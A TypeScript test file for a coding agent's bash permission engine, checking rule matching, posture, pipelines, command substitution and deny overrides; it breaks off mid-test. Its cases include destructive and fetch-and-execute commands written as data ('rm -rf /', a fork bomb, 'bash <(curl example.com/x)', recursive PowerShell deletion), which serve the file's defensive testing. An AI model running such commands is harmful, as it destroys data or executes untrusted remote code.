import { afterEach, describe, expect, it, test } from "bun:test";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { Settings } from "@oh-my-pi/pi-coding-agent/config/settings";
import {
	denyOverrideSuggestion,
	evaluateBashCommand,
	evaluatePermission,
	matchClassOf,
	matchRule,
	nearMissLine,
	patternSpecificity,
	resolvePosture,
	resolveWholeCommandRule,
} from "@oh-my-pi/pi-coding-agent/tools/permissions/engine";
import type { PermissionRule } from "@oh-my-pi/pi-coding-agent/tools/permissions/rules";
import {
	addSessionRule,
	clearSessionRules,
	sessionRuleKey,
} from "@oh-my-pi/pi-coding-agent/tools/permissions/session-rules";
import { removeSyncWithRetries, Snowflake } from "@oh-my-pi/pi-utils";
import { engineSettingsFrom } from "@oh-my-pi/pi-coding-agent/tools/permissions/settings";

const tool = (name: string, approval?: unknown) => ({ name, approval, formatApprovalDetails: undefined });

function ctx(extra: Record<string, unknown> = {}, cwd = "/tmp/perm-test") {
	return {
		settings: engineSettingsFrom(Settings.isolated({ "permissions.default": "prompt", ...extra })),
		cwd,
		home: "/tmp/perm-home",
	};
}

function write(file: string, content: string) {
	fs.mkdirSync(path.dirname(file), { recursive: true });
	fs.writeFileSync(file, content);
}

describe("resolvePosture", () => {
	it("maps legacy modes and defaults to prompt", () => {
		expect(resolvePosture(engineSettingsFrom(Settings.isolated({})))).toBe("prompt");
		expect(resolvePosture(engineSettingsFrom(Settings.isolated({ "tools.approvalMode": "yolo" })))).toBe("allow");
		expect(resolvePosture(engineSettingsFrom(Settings.isolated({ "tools.approvalMode": "write" })))).toBe("prompt");
		expect(resolvePosture(engineSettingsFrom(Settings.isolated({ "permissions.default": "deny" })))).toBe("deny");
	});
});

describe("evaluatePermission", () => {
	it("tool-declared deny is absolute", () => {
		const d = evaluatePermission(tool("bash", { tier: "exec", policy: "deny" }), { command: "x" }, ctx());
		expect(d.policy).toBe("deny");
		expect(d.source).toBe("tool");
	});
	it("legacy user deny wins over allow rules", () => {
		// tools.approval.bash: deny must beat a project allow rule — project rule file absent here,
		// so assert against posture instead: deny wins over posture allow.
		const d = evaluatePermission(tool("bash"), { command: "x" }, ctx({ "tools.approval": { bash: "deny" } }));
		expect(d.policy).toBe("deny");
	});
	it("curated deny fires for critical bash", () => {
		const d = evaluateBashCommand("rm -rf /", ctx());
		expect(d.policy).toBe("deny");
		expect(d.layer).toBe("curated");
	});
	it("legacy /…/-wrapped patterns keep glob-literal semantics (never regex)", () => {
		// The pre-engine approval path matched `/npm test/` as a literal glob
		// (leading/trailing slashes included), so it never matched a real
		// command. Regex interpretation would turn the legacy allow into an
		// unanchored auto-approve — the escape keeps it inert exactly as before.
		const wrapped = ctx({ "bash.patterns": [{ match: "/npm test/", approval: "allow" }] });
		expect(evaluatePermission(tool("bash"), { command: "npm test --force" }, wrapped).policy).toBe("prompt");
		expect(evaluatePermission(tool("bash"), { command: "npm test" }, wrapped).policy).toBe("prompt");
		expect(evaluateBashCommand("npm test", wrapped).policy).toBe("prompt");
		// A wrapped deny pattern stays inert too — it must not start denying.
		expect(
			evaluateBashCommand("npm test", ctx({ "bash.patterns": [{ match: "/npm test/", approval: "deny" }] })).policy,
		).toBe("prompt");
		// Control: unwrapped legacy patterns keep their glob behavior.
		const plain = ctx({ "bash.patterns": [{ match: "npm test", approval: "allow" }] });
		expect(evaluatePermission(tool("bash"), { command: "npm test" }, plain).policy).toBe("allow");
		expect(
			evaluateBashCommand("npm test", ctx({ "bash.patterns": [{ match: "npm test", approval: "deny" }] })).policy,
		).toBe("deny");
	});
	it("legacy bash.patterns deny fires per piece", () => {
		// Curated hard denies are absolute and precede the legacy pool (spec
		// §3.1), so `rm -rf /` would attribute to curated, not the legacy rule;
		// use a non-critical command to exercise the legacy deny pool path.
		const d = evaluateBashCommand(
			"git status && npm publish",
			ctx({ "bash.patterns": [{ match: "npm publish", approval: "deny" }] }),
		);
		expect(d.policy).toBe("deny");
		expect(d.pieces?.[1]?.ruleId).toBeDefined();
	});
	it("legacy bash.patterns allow never rides a compound", () => {
		const d = evaluateBashCommand(
			"git status && echo hi",
			ctx({ "bash.patterns": [{ match: "echo hi", approval: "allow" }] }),
		);
		// allow pattern may only vouch for a single-piece command:
		expect(d.policy).toBe("prompt");
		const single = evaluateBashCommand(
			"echo hi",
			ctx({ "bash.patterns": [{ match: "echo hi", approval: "allow" }] }),
		);
		expect(single.policy).toBe("allow");
	});
	it("deny-anywhere denies the whole compound and names the piece", () => {
		const d = evaluateBashCommand("echo ok; rm -rf /; echo done", ctx());
		expect(d.policy).toBe("deny");
		expect(d.reason).toContain("rm -rf /");
	});
	it("posture prompt leaves pending pieces listed", () => {
		const d = evaluateBashCommand("git status && npm test", ctx());
		expect(d.policy).toBe("prompt");
		expect(d.pieces).toHaveLength(2);
		expect(d.pieces!.every(p => p.policy === "prompt")).toBe(true);
	});
	it("curated read-only allowlist allows without prompting", () => {
		const d = evaluatePermission(tool("read"), { path: "x" }, ctx());
		expect(d.policy).toBe("allow");
	});
	it("posture allow allows unruled calls", () => {
		const d = evaluatePermission(tool("bash"), { command: "echo hi" }, ctx({ "permissions.default": "allow" }));
		expect(d.policy).toBe("allow");
	});
	it("project allow rule pre-approves a call", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "permissions.yml"),
				"rules:\n  - id: proj1\n    tool: bash\n    match: { command: 'npm test' }\n    action: allow\n    reason: project fixture\n",
			);
			const d = evaluatePermission(tool("bash"), { command: "npm test" }, ctx({}, dir));
			expect(d.policy).toBe("allow");
			expect(d.source).toBe("rule");
			expect(d.layer).toBe("project");
			expect(d.ruleId).toBe("proj1");
			expect(d.reason).toBe("project fixture");
			const split = evaluateBashCommand("npm test", ctx({}, dir));
			expect(split.policy).toBe("allow");
			expect(split.layer).toBe("project");
			expect(split.ruleId).toBe("proj1");
		} finally {
			removeSyncWithRetries(dir);
		}
	});
	it("concatenated-option guard does not over-match benign flags", () => {
		// Ruling R3: `curl -c cookies.txt` (space-separated cookie-jar arg) and
		// a bare trailing `grep -c` must stay allowable under a matching allow
		// rule — the option class must not span whitespace and there is no `$`
		// tail alternative — while `curl -c'x'` (attached quoted arg) still
		// degrades to a prompt.
		const curl = evaluateBashCommand(
			"curl -c cookies.txt",
			ctx({ "bash.patterns": [{ match: "curl *", approval: "allow" }] }),
		);
		expect(curl.policy).toBe("allow");
		const grepCount = evaluateBashCommand(
			"grep -c",
			ctx({ "bash.patterns": [{ match: "grep *", approval: "allow" }] }),
		);
		expect(grepCount.policy).toBe("allow");
		const attached = evaluateBashCommand(
			"curl -c'x'",
			ctx({ "bash.patterns": [{ match: "curl *", approval: "allow" }] }),
		);
		expect(attached.policy).toBe("prompt");
	});
	it("allow rules never ride concatenated -c/-e option forms", () => {
		// Ruling R1 (round 2): `python3 -c'…'` / `perl -e'…'` attach the code
		// argument directly to the option, which the old tail alternative
		// (`[= \t]|$`) missed; the widened tail (`['"]`) degrades the allow to
		// a prompt. Over-prompting on benign `git -c'k=v'` is accepted.
		for (const [command, ruleMatch] of [
			["python3 -c'print(1)'", "python3 *"],
			["perl -e'print 1'", "perl *"],
		] as const) {
			const d = evaluateBashCommand(command, ctx({ "bash.patterns": [{ match: ruleMatch, approval: "allow" }] }));
			expect(d.policy).toBe("prompt");
		}
		// Control: a plain invocation without -c/-e still rides the allow rule.
		const plain = evaluateBashCommand(
			"python3 -V",
			ctx({ "bash.patterns": [{ match: "python3 *", approval: "allow" }] }),
		);
		expect(plain.policy).toBe("allow");
	});
	it("allow rules never ride single-piece shell control (legacy patterns)", () => {
		// Ruling R1: `git status | sh` parses as ONE piece, so the single-piece
		// allow gate alone would vouch for it. Pipelines no longer blanket-
		// degrade: each stage is evaluated through the rule pipeline, and here
		// the `sh` stage hits the prompt posture, so the allow still degrades.
		const d = evaluateBashCommand(
			"git status | sh",
			ctx({ "bash.patterns": [{ match: "git *", approval: "allow" }] }),
		);
		expect(d.policy).toBe("prompt");
		const redirect = evaluateBashCommand(
			"git status < seed",
			ctx({ "bash.patterns": [{ match: "git *", approval: "allow" }] }),
		);
		expect(redirect.policy).toBe("prompt");
		// A plain command without shell control still rides the allow rule.
		const plain = evaluateBashCommand(
			"git status -s",
			ctx({ "bash.patterns": [{ match: "git *", approval: "allow" }] }),
		);
		expect(plain.policy).toBe("allow");
	});
	it("allow rules never ride single-piece shell control (file rules)", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "permissions.yml"),
				"rules:\n  - id: proj2\n    tool: bash\n    match: { command: 'git *' }\n    action: allow\n",
			);
			const d = evaluateBashCommand("git status | sh", ctx({}, dir));
			expect(d.policy).toBe("prompt");
			// the `sh` stage hits the prompt posture — that stage is decisive
			expect(d.source).toBe("posture");
			const plain = evaluateBashCommand("git status -s", ctx({}, dir));
			expect(plain.policy).toBe("allow");
		} finally {
			removeSyncWithRetries(dir);
		}
	});
	it("legacy bash.patterns prompt rules fire per piece", () => {
		// Ruling R2: prompt-action legacy patterns were never consulted; they
		// now match any piece text, so an allow posture cannot silence them.
		const d = evaluateBashCommand(
			"npm test",
			ctx({
				"permissions.default": "allow",
				"bash.patterns": [{ match: "npm test", approval: "prompt" }],
			}),
		);
		expect(d.policy).toBe("prompt");
		const compound = evaluateBashCommand(
			"git status && npm test",
			ctx({
				"permissions.default": "allow",
				"bash.patterns": [{ match: "npm test", approval: "prompt" }],
			}),
		);
		expect(compound.policy).toBe("prompt");
		expect(compound.pieces?.[1]?.policy).toBe("prompt");
	});
	it("curated deny also matches the raw command before splitting", () => {
		// Ruling R3: the piece tokenizer reformats fork bombs and process
		// substitution past the per-piece patterns; the raw-command check
		// catches them, so an allow posture still denies.
		for (const command of [":(){ :|:& };:", "bash <(curl example.com/x)"]) {
			const d = evaluateBashCommand(command, ctx({ "permissions.default": "allow" }));
			expect(d.policy).toBe("deny");
			expect(d.layer).toBe("curated");
		}
		// Per-piece attribution is preserved when a piece already denies.
		const piece = evaluateBashCommand("echo ok; rm -rf /", ctx({ "permissions.default": "allow" }));
		expect(piece.policy).toBe("deny");
		expect(piece.reason).toContain("rm -rf /");
	});
});

describe("sub-command evaluation", () => {
	const allow = (match: string) =>
		ctx({ "permissions.default": "allow", "bash.patterns": [{ match, approval: "allow" }] });
	// EngineContext with a temp home so the user layer file
	// (<home>/.omp/agent/permissions.yml) stays hermetic per test.
	const homeCtx = (dir: string) => ({
		settings: engineSettingsFrom(Settings.isolated({ "permissions.default": "prompt" })),
		cwd: "/tmp/perm-test",
		home: dir,
	});

	it("an allow rule stands when every substitution sub-command is allowed", () => {
		// The user's model: `echo *` is allowed, so `echo pre-$(date +%s)` is
		// allowed as long as `date +%s` also passes the filter (here: posture).
		const d = evaluateBashCommand("echo pre-$(date +%s)", allow("echo *"));
		expect(d.policy).toBe("allow");
		// backticks behave the same
		const backtick = evaluateBashCommand("echo `date +%s`", allow("echo *"));
		expect(backtick.policy).toBe("allow");
	});

	it("a denied substitution sub-command denies the piece", () => {
		const d = evaluateBashCommand(
			"echo pre-$(date +%s)",
			ctx({
				"permissions.default": "allow",
				"bash.patterns": [
					{ match: "echo *", approval: "allow" },
					{ match: "date *", approval: "deny" },
				],
			}),
		);
		expect(d.policy).toBe("deny");
		expect(d.reason).toContain("date +%s");
	});

	it("a prompt posture sub-command prompts the piece", () => {
		const d = evaluateBashCommand(
			"echo pre-$(date +%s)",
			ctx({ "bash.patterns": [{ match: "echo *", approval: "allow" }] }),
		);
		expect(d.policy).toBe("prompt");
	});

	it("curated criticals inside substitutions still deny", () => {
		const d = evaluateBashCommand("echo $(rm -rf /)", allow("echo *"));
		expect(d.policy).toBe("deny");
		expect(d.layer).toBe("curated");
	});

	it("pipeline stages are evaluated through the same filter", () => {
		const d = evaluateBashCommand("echo a | head -1", allow("*"));
		expect(d.policy).toBe("allow");
		const denied = evaluateBashCommand(
			"echo a | date +%s",
			ctx({ "permissions.default": "allow", "bash.patterns": [{ match: "date *", approval: "deny" }] }),
		);
		expect(denied.policy).toBe("deny");
	});

	it("parameter-expansion values can smuggle substitutions and are checked", () => {
		const d = evaluateBashCommand(`echo \${x:-$(date +%s)}`, allow("echo *"));
		expect(d.policy).toBe("allow");
		const denied = evaluateBashCommand(
			`echo \${x:-$(date +%s)}`,
			ctx({ "permissions.default": "allow", "bash.patterns": [{ match: "date *", approval: "deny" }] }),
		);
		expect(denied.policy).toBe("deny");
	});

	it("redirects check their write target; interpreter options still degrade to a prompt", () => {
		// A redirect is a write to its target file: when the target is
		// sanctioned by posture (allow mode), the rule-backed base allow
		// stands — the redirect is analyzed, not blanket-degraded.
		const redirect = evaluateBashCommand("echo hi > /tmp/x", allow("echo *"));
		expect(redirect.policy).toBe("allow");
		// Under prompt posture the /tmp write is unsanctioned → still prompts.
		const unsanctioned = evaluateBashCommand(
			"echo hi > /tmp/x",
			ctx({ "bash.patterns": [{ match: "echo *", approval: "allow" }] }),
		);
		expect(unsanctioned.policy).toBe("prompt");
		// Interpreter reinterpreting options smuggle code — there is no
		// redirect write to check, so the R1 degradation stands even under
		// allow-all.
		const pwsh = evaluateBashCommand("pwsh -Command 'Remove-Item -Recurse /'", allow("*"));
		expect(pwsh.policy).toBe("prompt");
		const cmdExe = evaluateBashCommand("cmd /c del /f /q x", allow("*"));
		expect(cmdExe.policy).toBe("prompt");
	});

	it("malformed substitutions and excessive nesting degrade rule allows to a prompt", () => {
		// R1 for rule-backed allows: a file rule matching `echo *` must not
		// vouch for unanalyzable residue, so both cases still prompt. (Posture
		// allows skip this degradation — see the posture-vs-R1 describe.)
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "permissions.yml"),
				"rules:\n  - id: echo-all\n    tool: bash\n    match: { command: 'echo *' }\n    action: allow\n",
			);
			const unclosed = evaluateBashCommand("echo $(date", ctx({}, dir));
			expect(unclosed.policy).toBe("prompt");
			// depth 9 > SUB_COMMAND_MAX_DEPTH (8)
			let deep = "date";
			for (let i = 0; i < 9; i++) deep = `echo $(${deep})`;
			const nested = evaluateBashCommand(deep, ctx({}, dir));
			expect(nested.policy).toBe("prompt");
		} finally {
			removeSyncWithRetries(dir);
		}
	});

	test("git log * rule covers git log | head via safe-consumer exemption", () => {
		// user rule file: allow bash "git log *" (layer user)
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: allow-git\n    tool: bash\n    match: { command: 'git log *' }\n    action: allow\n",
			);
			const d = evaluateBashCommand("git log -n 5 | head -1", homeCtx(dir));
			expect(d.policy).toBe("allow");
		} finally {
			removeSyncWithRetries(dir);
		}
	});

	test("safe-consumer exemption never beats a matching deny", () => {
		// user rule file: allow bash "git log *" + deny bash "head *". The
		// piece is rule-allowed, so the sub-command loop runs; the loop's deny
		// branch must beat the safe-consumer exemption for the `head -1` stage.
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: allow-git\n    tool: bash\n    match: { command: 'git log *' }\n    action: allow\n  - id: deny-head\n    tool: bash\n    match: { command: 'head *' }\n    action: deny\n",
			);
			const d = evaluateBashCommand("git log -n 5 | head -1", homeCtx(dir));
			expect(d.policy).toBe("deny");
		} finally {
			removeSyncWithRetries(dir);
		}
	});

	test("safe-consumer exemption only covers stages no rule touched", () => {
		// user rule file: allow bash "git log *" + prompt bash "head *". A
		// prompt-action rule touches the stage (source "rule"), so the
		// exemption — which requires source "posture" — must not apply.
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: allow-git\n    tool: bash\n    match: { command: 'git log *' }\n    action: allow\n  - id: prompt-head\n    tool: bash\n    match: { command: 'head *' }\n    action: prompt\n",
			);
			const d = evaluateBashCommand("git log -n 5 | head -1", homeCtx(dir));
			expect(d.policy).toBe("prompt");
		} finally {
			removeSyncWithRetries(dir);
		}
	});

	test("exemption never carries redirections or command substitutions", () => {
		// user rule file: allow bash "git log *". A `head` stage with a
		// redirect or substitution is not a pure filter — the exemption must
		// not let unanalyzed write/exec content through (review round 1).
		for (const command of ["git log -n 5 | head -1 > /tmp/out", "git log -n 5 | head -1 $(touch /tmp/x)"]) {
			const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
			try {
				write(
					path.join(dir, ".omp", "agent", "permissions.yml"),
					"rules:\n  - id: allow-git\n    tool: bash\n    match: { command: 'git log *' }\n    action: allow\n",
				);
				const d = evaluateBashCommand(command, homeCtx(dir));
				expect(d.policy).toBe("prompt");
			} finally {
				removeSyncWithRetries(dir);
			}
		}
	});

	test("rule-allowed stage piped to sh still prompts: sh is neither safe nor matched", () => {
		// user rule file: allow bash "echo *". NOT `curl … | sh`: the
		// curated critical set hard-denies remote-fetch-then-execute on the raw
		// command, so that shape can never reach the stage loop. `echo data |
		// sh` exercises the same §4.3 case — allowed first stage, `sh` stage
		// neither safe nor matched — without tripping a curated deny.
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: allow-echo\n    tool: bash\n    match: { command: 'echo *' }\n    action: allow\n",
			);
			const d = evaluateBashCommand("echo data | sh", homeCtx(dir));
			expect(d.policy).toBe("prompt");
		} finally {
			removeSyncWithRetries(dir);
		}
	});
});

describe("piece evaluation data (v3 dialog)", () => {
	// EngineContext with a temp home (user layer file stays hermetic).
	const homeCtx = (dir: string) => ({
		settings: engineSettingsFrom(Settings.isolated({ "permissions.default": "prompt" })),
		cwd: "/tmp/perm-test",
		home: dir,
	});

	test("piece evaluations carry the top-level operator", () => {
		const decision = evaluateBashCommand("git log -n 5 && git status", ctx());
		const ops = (decision.pieces ?? []).map(piece => piece.operator);
		expect(ops[0]).toBeNull();
		expect(ops[1]).toBe("&&");
	});

	test("near-miss only reports a genuinely close rule (same first token, narrower)", () => {
		// user rule file: allow bash "git branch -a *" + allow bash "echo *".
		// The echo rule shares no first token with git commands, so it is never
		// close (plan ruling: the original "git status" negative case was wrong —
		// git status IS a near miss of "git branch -a *").
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: branch-a\n    tool: bash\n    match: { command: 'git branch -a *' }\n    action: allow\n  - id: echo-all\n    tool: bash\n    match: { command: 'echo *' }\n    action: allow\n",
			);
			const c = homeCtx(dir);
			const miss = nearMissLine("git branch -b new", c);
			expect(miss).toContain("git branch -a *");
			expect(miss).not.toContain("echo *"); // different command family is never close
			expect(nearMissLine("npm test", c)).toBeUndefined(); // no rule in this family
		} finally {
			removeSyncWithRetries(dir);
		}
	});
});

const rule = (partial: Partial<PermissionRule>): PermissionRule => ({
	id: "r",
	tool: "bash",
	match: { command: "*" },
	action: "allow",
	layer: "user",
	...partial,
});

describe("match classes and specificity (spec §3.1)", () => {
	test("pipe-less pattern on piped command is covering; same shape is exact-structure", () => {
		expect(matchClassOf("git log *", "git log -n 5 | head -1")).toBe("covering");
		expect(matchClassOf("git log *", "git log -n 5")).toBe("exact-structure");
		expect(matchClassOf("git log * | head *", "git log -n 5 | head -1")).toBe("exact-structure");
		expect(matchClassOf("git log * | head *", "git log -n 5")).toBe("covering");
	});

	test("specificity counts literal whitespace tokens; regex scores literal prefix", () => {
		expect(patternSpecificity("command", "* | head *")).toBe(2); // "|" and "head" are literal tokens
		expect(patternSpecificity("command", "git branch * | head *")).toBe(4); // git, branch, |, head
		expect(patternSpecificity("command", "git log *")).toBe(2);
		expect(patternSpecificity("command", "/git branch/")).toBe(10); // literal prefix "git branch"
		expect(patternSpecificity("path", "packages/coding-agent/**")).toBe(2);
	});

	test("exact-structure beats covering regardless of action", () => {
		const denyGeneral = rule({ id: "deny-head", action: "deny", match: { command: "* | head *" } });
		const allowCovering = rule({ id: "allow-git", match: { command: "git log *" } });
		const args = { command: "git log -n 5 | head -1" };
		expect(resolveWholeCommandRule([allowCovering, denyGeneral], "bash", args)?.rule.id).toBe("deny-head");
	});

	test("more specific whole-command allow beats general deny", () => {
		const denyGeneral = rule({ id: "deny-head", action: "deny", match: { command: "* | head *" } });
		const allowSpecific = rule({ id: "allow-git-head", match: { command: "git log * | head *" } });
		const args = { command: "git log -n 5 | head -1" };
		expect(resolveWholeCommandRule([denyGeneral, allowSpecific], "bash", args)?.rule.id).toBe("allow-git-head");
	});

	test("deny wins ties at equal class and specificity", () => {
		const deny = rule({ id: "d", action: "deny", match: { command: "git log *" } });
		const allow = rule({ id: "a", match: { command: "git log *" } });
		const args = { command: "git log -n 5" };
		expect(resolveWholeCommandRule([allow, deny], "bash", args)?.rule.id).toBe("d");
	});

	test("layer order breaks same-action ties (project over user)", () => {
		const user = rule({ id: "u", layer: "user", match: { command: "git log *" } });
		const project = rule({ id: "p", layer: "project", match: { command: "git log *" } });
		const args = { command: "git log -n 5" };
		expect(resolveWholeCommandRule([user, project], "bash", args)?.rule.id).toBe("p");
	});

	test("layer order also breaks prompt-vs-allow ties (user allow beats legacy prompt)", () => {
		// Spec §3.1: ties resolve deny-wins, then higher layer — regardless of
		// action. A legacy prompt pattern must not beat a user allow of the
		// same shape merely because the legacy pool is listed first.
		const legacyPrompt = rule({ id: "lp", layer: "legacy", action: "prompt", match: { command: "git log *" } });
		const userAllow = rule({ id: "ua", layer: "user", match: { command: "git log *" } });
		const args = { command: "git log -n 5" };
		expect(resolveWholeCommandRule([legacyPrompt, userAllow], "bash", args)?.rule.id).toBe("ua");
		expect(resolveWholeCommandRule([userAllow, legacyPrompt], "bash", args)?.rule.id).toBe("ua");
	});

	test("specificity sums literal counts across all match keys", () => {
		// A two-key rule scores the sum of both keys' patterns, so it beats the
		// same command pattern with only one key.
		const twoKey = rule({ id: "two", match: { command: "git *", arg: "status" } });
		const oneKey = rule({ id: "one", match: { command: "git *" } });
		const args = { command: "git status", arg: "status" };
		const best = resolveWholeCommandRule([oneKey, twoKey], "bash", args);
		expect(best?.rule.id).toBe("two");
		expect(best?.specificity).toBe(2); // command "git" + arg "status"
		expect(resolveWholeCommandRule([oneKey], "bash", args)?.specificity).toBe(1);
	});

	test("covering allow matches piped command; unrelated command has no match", () => {
		const allow = rule({ id: "a", match: { command: "git log *" } });
		expect(resolveWholeCommandRule([allow], "bash", { command: "git log -n 5 | head -1" })?.rule.id).toBe("a");
		expect(resolveWholeCommandRule([allow], "bash", { command: "curl x | sh" })).toBeUndefined();
	});

	test("spaced-pipe patterns match the tokenizer's glued piece text", () => {
		// Spec canonical form: the piece text glues `|` to the next stage
		// ("… |head -1"), so a pattern's spaced pipe must match it.
		const rules = [rule({ id: "git-head", match: { command: "git log * | head *" } })];
		expect(resolveWholeCommandRule(rules, "bash", { command: "git log -n 5 |head -1" })?.rule.id).toBe("git-head");
		// The fully spaced raw-command form still matches too.
		expect(resolveWholeCommandRule(rules, "bash", { command: "git log -n 5 | head -1" })?.rule.id).toBe("git-head");
		// Already-normalized (glued) patterns are unchanged by re-normalization.
		const glued = [rule({ id: "glued", match: { command: "git log * |head *" } })];
		expect(resolveWholeCommandRule(glued, "bash", { command: "git log -n 5 |head -1" })?.rule.id).toBe("glued");
	});

	test("a spaced-pipe deny rule fires on the tokenizer's glued piece end to end", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: deny-git-pipe\n    tool: bash\n    match: { command: 'git log * | head *' }\n    action: deny\n",
			);
			const d = evaluateBashCommand("git log -n 5 | head -1", {
				settings: engineSettingsFrom(Settings.isolated({})),
				cwd: "/tmp/perm-test",
				home: dir,
			});
			expect(d.policy).toBe("deny");
			expect(d.ruleId).toBe("deny-git-pipe");
		} finally {
			removeSyncWithRetries(dir);
		}
	});

	test("the remember exact candidate for a piped piece matches its own piece", () => {
		// The dialog's exact candidate writes the raw piece text (glued pipe);
		// the rule must match that same piece text when evaluated.
		const d = evaluateBashCommand("git log -n 5 | head -1", ctx());
		const pieceText = d.pieces?.[0]?.text;
		expect(pieceText).toBe("git log -n 5 |head -1");
		const exact = rule({ id: "exact", match: { command: pieceText ?? "" } });
		expect(resolveWholeCommandRule([exact], "bash", { command: pieceText ?? "" })?.rule.id).toBe("exact");
	});
});

describe("path-pattern matching expands ~ (bug 9)", () => {
	const rule = (match: Record<string, unknown>): PermissionRule => ({
		id: "t",
		tool: "edit",
		match,
		action: "allow",
		layer: "user",
	});

	it("a ~/… path pattern matches the absolute call path", () => {
		const home = os.homedir();
		const target = path.join(home, ".omp", "plugins", "SKILL.md");
		expect(matchRule(rule({ path: "~/.omp/plugins/*" }), "edit", { path: target })).toBe(true);
	});

	it("a bare ~ pattern matches the home directory itself", () => {
		expect(matchRule(rule({ path: "~" }), "edit", { path: os.homedir() })).toBe(true);
	});

	it("a ~-value call path matches an absolute pattern and vice versa", () => {
		const home = os.homedir();
		expect(matchRule(rule({ path: path.join(home, ".omp", "*") }), "edit", { path: "~/.omp/x" })).toBe(true);
		expect(matchRule(rule({ path: "~/.omp/*" }), "edit", { path: path.join(home, ".omp", "x") })).toBe(true);
	});

	it("command keys never expand ~ — it is literal command text", () => {
		const r = (match: Record<string, unknown>): PermissionRule => ({
			id: "t",
			tool: "bash",
			match,
			action: "allow",
			layer: "user",
		});
		expect(matchRule(r({ command: "cd ~/x" }), "bash", { command: "cd ~/x" })).toBe(true);
		expect(matchRule(r({ command: "cd ~/x*" }), "bash", { command: "cd ~/x/y" })).toBe(true);
		// without expansion the pattern cannot jump to the absolute form
		expect(matchRule(r({ command: `cd ${os.homedir()}/x *` }), "bash", { command: "cd ~/x/y" })).toBe(false);
	});
});

describe("denyOverrideSuggestion (spec §5.2)", () => {
	// EngineContext with a temp home so the user layer file stays hermetic.
	const denyCtx = (dir: string) => ({
		settings: engineSettingsFrom(Settings.isolated({ "permissions.default": "prompt" })),
		cwd: "/tmp/perm-test",
		home: dir,
	});

	test("no deny rule means a posture deny — no override can exist", () => {
		// no rules at all: a rule allow beats the posture, so the caller
		// suggests the first candidate instead of a dead end.
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			const result = denyOverrideSuggestion("git branch -a | head -20", denyCtx(dir));
			expect(result.status).toBe("no-deny");
		} finally {
			removeSyncWithRetries(dir);
		}
	});

	test("a deny with no beating allow is a dead end", () => {
		// user file: deny bash "* | head *"
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: deny-pipe\n    tool: bash\n    match: { command: '* | head *' }\n    action: deny\n",
			);
			const result = denyOverrideSuggestion("git branch -a | head -20", denyCtx(dir));
			expect(result.status).toBe("dead-end");
			if (result.status === "dead-end") expect(result.deny.id).toBe("deny-pipe");
		} finally {
			removeSyncWithRetries(dir);
		}
	});

	test("reports the candidate allow when one would win", () => {
		// user file: deny bash "* | head *" AND allow bash "git branch * | head *"
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: deny-pipe\n    tool: bash\n    match: { command: '* | head *' }\n    action: deny\n  - id: allow-git-pipe\n    tool: bash\n    match: { command: 'git branch * | head *' }\n    action: allow\n",
			);
			const result = denyOverrideSuggestion("git branch -a | head -20", denyCtx(dir));
			expect(result.status).toBe("override");
			if (result.status === "override") {
				expect(result.deny.id).toBe("deny-pipe");
				expect(result.allow.rule.match.command).toBe("git branch * | head *");
				expect(result.allow.matchClass).toBe("exact-structure");
				expect(result.allow.specificity).toBe(4);
			}
		} finally {
			removeSyncWithRetries(dir);
		}
	});

	test("an allow that does not strictly beat the deny never overrides", () => {
		// user file: deny bash "git * | head *" + allow bash "git *". The
		// allow is covering and less specific — the deny still stands.
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: deny-git-pipe\n    tool: bash\n    match: { command: 'git * | head *' }\n    action: deny\n  - id: allow-git\n    tool: bash\n    match: { command: 'git *' }\n    action: allow\n",
			);
			const result = denyOverrideSuggestion("git branch -a | head -20", denyCtx(dir));
			expect(result.status).toBe("dead-end");
		} finally {
			removeSyncWithRetries(dir);
		}
	});

	test("legacy bash.patterns denies join the suggestion's deny pool", () => {
		// settings bash.patterns deny "* | head *" + user file allow
		// "git branch * | head *": the override must name the legacy deny.
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-engine-${Snowflake.next()}-`));
		try {
			write(
				path.join(dir, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: allow-git-pipe\n    tool: bash\n    match: { command: 'git branch * | head *' }\n    action: allow\n",
			);
			const c = {
				settings: engineSettingsFrom(
					Settings.isolated({
						"permissions.default": "prompt",
						"bash.patterns": [{ match: "* | head *", approval: "deny" }],
					}),
				),
				cwd: "/tmp/perm-test",
				home: dir,
			};
